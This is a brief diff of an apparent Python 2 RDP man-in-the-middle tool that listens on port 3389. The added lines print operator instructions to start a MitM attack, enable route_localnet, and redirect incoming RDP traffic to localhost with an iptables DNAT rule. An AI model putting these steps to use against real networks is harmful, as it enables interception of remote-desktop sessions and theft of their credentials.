@@ -52,7 +52,9 @@ options.serverName = options.computer.split('$')[0]
 
 
 sock, context= initSSLContext()
-
+print "You need to start MitM first"
+print '!!! Be sure to "sysctl -w net.ipv4.conf.all.route_localnet=1" !!!'
+print '!!! Redirect Traffic "iptables -t nat -A PREROUTING -p tcp --dport 3389 -j DNAT --to-destination 127.0.0.1:3389" !!!'
 while(True):
     (cli,ip)=sock.accept()
     cli.recv(4092)
